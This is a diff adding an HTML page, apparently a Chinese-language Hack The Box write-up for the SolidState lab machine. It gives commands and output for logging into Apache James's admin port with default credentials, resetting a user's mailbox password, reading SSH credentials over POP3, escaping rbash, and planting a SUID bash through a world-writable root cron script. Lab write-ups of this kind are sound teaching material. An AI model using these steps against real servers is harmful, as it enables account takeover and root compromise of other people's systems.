@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB SolidState — Nauhcnes</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--phase-recon:#60a5fa;--phase-foothold:#4ade80;--phase-lateral:#a78bfa;--phase-privesc:#f87171;--medium:#fbbf24;--linux:#60a5fa}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,pre{font-family:'IBM Plex Mono',monospace}
+code{background:var(--surface-raised);padding:0.15em 0.4em;border-radius:3px;font-size:0.88em}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;font-size:0.82rem;line-height:1.6;margin:1rem 0}
+.header{border-bottom:1px solid var(--border);padding:2.5rem 2rem 2rem;position:relative}
+.header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:var(--medium)}
+.header-inner{max-width:820px;margin:0 auto}
+.back{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted);text-decoration:none;display:inline-block;margin-bottom:1rem}
+.back:hover{color:var(--accent)}
+.header h1{font-size:2rem;font-weight:700;color:var(--heading);letter-spacing:-0.02em}
+.header-meta{margin-top:0.6rem;font-family:'IBM Plex Mono',monospace;font-size:0.78rem;color:var(--text-muted);display:flex;gap:1.2rem;flex-wrap:wrap}
+.tag{padding:0.15rem 0.5rem;border-radius:3px;background:var(--surface-raised)}
+.tag-medium{color:var(--medium)}
+.tag-linux{color:var(--linux)}
+main{max-width:820px;margin:0 auto;padding:1.5rem 2rem 4rem}
+h2{font-size:1.3rem;font-weight:700;color:var(--heading);margin:2.5rem 0 1rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.05rem;font-weight:600;color:var(--heading);margin:1.8rem 0 0.8rem}
+h4{font-size:0.95rem;font-weight:600;color:var(--heading);margin:1.4rem 0 0.6rem}
+p{margin:0.6rem 0}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem}
+th,td{border:1px solid var(--border);padding:0.5rem 0.8rem;text-align:left}
+th{background:var(--surface);color:var(--heading);font-weight:600}
+td{background:var(--surface)}
+.callout{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.2rem;margin:1rem 0;font-size:0.9rem}
+.callout-warn{border-left-color:var(--medium)}
+.phase{font-family:'IBM Plex Mono',monospace;font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.2rem 0.6rem;border-radius:3px;display:inline-block;margin-bottom:0.4rem}
+.phase-recon{background:#1e3a5f40;color:var(--phase-recon)}
+.phase-foothold{background:#16653420;color:var(--phase-foothold)}
+.phase-privesc{background:#991b1b20;color:var(--phase-privesc)}
+.diagram{display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding:1.2rem;background:var(--surface);border:1px solid var(--border);border-radius:6px;margin:1.5rem 0;font-family:'IBM Plex Mono',monospace;font-size:0.78rem}
+.node{padding:0.3rem 0.7rem;border-radius:4px;white-space:nowrap}
+.node-green{background:#16653430;color:var(--phase-foothold);border:1px solid #16653460}
+.node-red{background:#991b1b30;color:var(--phase-privesc);border:1px solid #991b1b60}
+.arrow{color:var(--text-muted)}
+.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;color:var(--text-muted);border-top:1px solid var(--border)}
+.gate{position:fixed;inset:0;background:var(--bg);z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:1rem}
+.gate input{background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.9rem;text-align:center;outline:none;width:220px}
+.gate input:focus{border-color:var(--accent)}
+.gate label{font-family:'IBM Plex Mono',monospace;font-size:0.8rem;color:var(--text-muted)}
+.gate .err{color:var(--phase-privesc);font-size:0.75rem;font-family:'IBM Plex Mono',monospace;height:1rem}
+</style>
+</head>
+<body>
+
+<div class="gate" id="gate">
+<label>输入机器名称解锁</label>
+<input type="password" id="gate-pw" placeholder="machine name" autofocus>
+<div class="err" id="gate-err"></div>
+</div>
+<script>
+document.getElementById('gate-pw').addEventListener('keydown',function(e){
+if(e.key==='Enter'){
+if(this.value.toLowerCase()==='solidstate'){document.getElementById('gate').style.display='none'}
+else{document.getElementById('gate-err').textContent='wrong password'}
+}});
+</script>
+
+<div class="header">
+<div class="header-inner">
+<a class="back" href="../">← 返回目录</a>
+<h1>SolidState</h1>
+<div class="header-meta">
+<span class="tag tag-medium">Medium</span>
+<span class="tag tag-linux">Linux</span>
+<span>10.129.55.82</span>
+</div>
+</div>
+</div>
+
+<main>
+
+<div class="diagram"><span class="node node-green">James 4555 默认密码</span><span class="arrow">→</span><span class="node node-green">重置邮箱密码</span><span class="arrow">→</span><span class="node node-green">POP3 读 SSH 凭据</span><span class="arrow">→</span><span class="node node-green">ssh -t bash 绕过 rbash</span><span class="arrow">→</span><span class="node node-red">777 cron 脚本 → SUID bash → root</span></div>
+
+<h2><span class="phase phase-recon">信息收集</span> Nmap 扫描</h2>
+
+<pre>sudo nmap -sCV -p- -T4 10.129.55.82</pre>
+
+<pre>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian
+25/tcp   open  smtp    JAMES SMTP Server 2.3.2
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+110/tcp  open  pop3    JAMES POP3 Server 2.3.2
+119/tcp  open  nntp    JAMES NNTP Server
+4555/tcp open  rsip?   JAMES Remote Administration Tool 2.3.2</pre>
+
+<p>关键发现：<strong>Apache James 2.3.2</strong> 邮件服务器，开放了 SMTP(25)、POP3(110)、NNTP(119) 和管理端口(4555)。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：这台机器运行一个邮件服务器。它有几扇门：25 号门用来发邮件，110 号门用来收邮件，4555 号门是"管理员专用后门"——用来管理所有邮箱账号。如果这扇后门的密码是默认的，我们就能控制所有人的邮箱。</div>
+
+<h2><span class="phase phase-foothold">立足点</span> James 默认密码 → 邮箱重置 → SSH 凭据</h2>
+
+<h3>James 管理端口默认凭据</h3>
+<p>Apache James 2.x 的远程管理端口 4555 使用纯文本 Telnet 协议，默认凭据为 <code>root:root</code>：</p>
+
+<pre>telnet 10.129.55.82 4555</pre>
+
+<pre>JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands</pre>
+
+<h3>枚举邮箱用户</h3>
+<pre>listusers</pre>
+<pre>Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin</pre>
+
+<h3>重置 mindy 的邮箱密码</h3>
+<pre>setpassword mindy writeup</pre>
+<pre>Password for mindy reset</pre>
+
+<div class="callout">🧒 <strong>儿童版</strong>：邮件服务器的管理密码是出厂默认的 <code>root:root</code>，没人改过。我们登录管理后台，把 mindy 的邮箱密码改成了自己知道的密码。就像物业有所有住户的万能钥匙，而物业办公室的门锁还是出厂密码。</div>
+
+<h3>POP3 读取 mindy 的邮件</h3>
+<pre>telnet 10.129.55.82 110</pre>
+
+<pre>USER mindy
++OK
+PASS writeup
++OK Welcome mindy
+LIST
++OK 2 1945
+1 1109
+2 836
+RETR 2</pre>
+
+<p>第二封邮件内容：</p>
+
+<pre>From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+Here are your ssh credentials to access the system.
+Remember to reset your password after your first login.
+Your access is restricted at the moment, feel free to ask
+your supervisor to add any commands you need to your path.
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James</pre>
+
+<h3>SSH 登录</h3>
+<pre>ssh mindy@10.129.55.82
+# 密码: P@55W0rd1!2@</pre>
+
+<pre>mindy@solidstate:~$ cat user.txt
+95f14cd5336803a8910fa4fe2bdd7a93</pre>
+
+<h3>绕过 rbash 受限 Shell</h3>
+<p>登录后发现 mindy 的 shell 是 <code>/bin/rbash</code>（受限 bash），很多命令无法执行。绕过方法：</p>
+
+<pre>ssh mindy@10.129.55.82 -t bash</pre>
+
+<p><code>-t bash</code> 参数让 SSH 在建立连接后直接启动 <code>/bin/bash</code>，绕过 <code>.bashrc</code> 中配置的 rbash 限制。</p>
+
+<div class="callout callout-warn">
+<p><strong>⚠️ 踩坑提醒</strong></p>
+<p>POP3 协议命令是 <code>USER</code>/<code>PASS</code>/<code>LIST</code>/<code>RETR</code>，不是 Linux 命令</p>
+<p><code>RETR 1</code> 读第一封邮件，<code>RETR 2</code> 读第二封——要逐封检查，SSH 凭据在第二封</p>
+<p>rbash 会限制 <code>cd</code>、路径中的 <code>/</code>、环境变量修改等，用 <code>ssh -t bash</code> 是最简单的绕过方式</p>
+</div>
+
+<h2><span class="phase phase-privesc">权限提升</span> World-Writable Cron 脚本</h2>
+
+<h3>发现可写的 root 脚本</h3>
+<pre>ls -la /opt/</pre>
+<pre>-rwxrwxrwx 1 root root 105 Aug 22 2017 tmp.py</pre>
+
+<p><code>/opt/tmp.py</code> 由 <strong>root 拥有</strong>，但权限是 <strong>777（所有人可读写执行）</strong>。这个脚本被 root 的 cron 定时任务定期执行（用于清理 <code>/tmp</code> 目录）。</p>
+
+<div class="callout">🧒 <strong>儿童版</strong>：root 用户有一个自动脚本，每隔几分钟运行一次来清理临时文件。但这个脚本的权限设置有 bug——任何人都能修改它的内容。我们把"清理临时文件"改成"复制一个 root 权限的 bash 给我"，然后坐等 root 帮我们执行。</div>
+
+<h3>修改脚本内容</h3>
+<pre>cat &gt; /opt/tmp.py &lt;&lt; 'EOF'
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('/bin/cp /bin/bash /tmp/rootbash;/bin/chmod 4777 /tmp/rootbash; ')
+except:
+     sys.exit()
+EOF</pre>
+
+<h3>等待 Cron 执行</h3>
+<p>等待几分钟后：</p>
+
+<pre>ls -la /tmp/rootbash
+-rwsrwxrwx 1 root root 1265272 Sep  7 15:57 rootbash</pre>
+
+<p>SUID bash 已生成。</p>
+
+<pre>/tmp/rootbash -p</pre>
+
+<pre>rootbash-4.4# whoami
+root
+
+rootbash-4.4# cat /root/root.txt
+96e412b15fda980fee47c7e55a269f1e</pre>
+
+<h2>知识点速查表</h2>
+
+<table>
+<tr><th>阶段</th><th>技术</th><th>工具</th><th>助记词</th></tr>
+<tr><td>信息收集</td><td>邮件服务器端口识别</td><td>nmap（25/110/4555）</td><td>🔍 "找邮局后门"</td></tr>
+<tr><td>立足点</td><td>James 管理端口默认密码</td><td>telnet 4555 root:root</td><td>🔑 "出厂密码没改"</td></tr>
+<tr><td>凭据获取</td><td>重置邮箱密码 + POP3 读邮件</td><td>setpassword + RETR</td><td>📧 "改密码偷信"</td></tr>
+<tr><td>Shell 绕过</td><td>rbash → ssh -t bash</td><td>ssh -t bash</td><td>🔓 "绕过受限壳"</td></tr>
+<tr><td>权限提升</td><td>777 权限 cron Python 脚本</td><td>修改 /opt/tmp.py</td><td>📝 "改 root 的作业本"</td></tr>
+</table>
+
+<h2>额外知识</h2>
+
+<h3>Apache James 2.x 管理端口</h3>
+<p>Apache James 是 Java 编写的开源邮件服务器。2.x 版本通过 4555 端口提供纯文本管理界面，默认凭据 <code>root:root</code>。常用命令：</p>
+
+<table>
+<tr><th>命令</th><th>功能</th></tr>
+<tr><td><code>listusers</code></td><td>列出所有邮箱用户</td></tr>
+<tr><td><code>adduser &lt;user&gt; &lt;pass&gt;</code></td><td>添加用户</td></tr>
+<tr><td><code>setpassword &lt;user&gt; &lt;pass&gt;</code></td><td>重置用户密码</td></tr>
+<tr><td><code>verify &lt;user&gt;</code></td><td>验证用户是否存在</td></tr>
+<tr><td><code>deluser &lt;user&gt;</code></td><td>删除用户</td></tr>
+</table>
+
+<p>James 3.x 已移除 4555 端口的 Telnet 管理方式，改用 JMX（端口 9999）和 <code>james-cli</code> 工具。渗透测试中遇到 4555 端口时，第一反应应该是尝试 <code>root:root</code>。</p>
+
+<h3>POP3 协议基础</h3>
+<p>POP3（Post Office Protocol v3）是最基本的邮件接收协议，基于纯文本：</p>
+
+<table>
+<tr><th>命令</th><th>功能</th></tr>
+<tr><td><code>USER &lt;name&gt;</code></td><td>指定用户名</td></tr>
+<tr><td><code>PASS &lt;password&gt;</code></td><td>输入密码</td></tr>
+<tr><td><code>LIST</code></td><td>列出邮件编号和大小</td></tr>
+<tr><td><code>RETR &lt;n&gt;</code></td><td>读取第 n 封邮件全文</td></tr>
+<tr><td><code>DELE &lt;n&gt;</code></td><td>标记删除第 n 封</td></tr>
+<tr><td><code>STAT</code></td><td>查看邮件数量和总大小</td></tr>
+<tr><td><code>QUIT</code></td><td>退出并执行删除</td></tr>
+</table>
+
+<p>由于是纯文本协议，用 <code>telnet</code> 或 <code>nc</code> 即可直接交互，不需要邮件客户端。</p>
+
+<h3>World-Writable 文件安全隐患</h3>
+<p>Linux 文件权限为 777（<code>rwxrwxrwx</code>）意味着任何用户都可以读、写、执行该文件。如果这个文件还被 root 的 cron 任务执行，就形成了提权路径。查找这类文件的命令：</p>
+
+<pre># 查找所有人可写的文件（排除 /proc /sys /dev）
+find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -type f 2&gt;/dev/null
+
+# 查找 777 权限的文件
+find / -perm -0777 -type f 2&gt;/dev/null</pre>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB SolidState 攻略 · 2026</footer>
+</body></html>
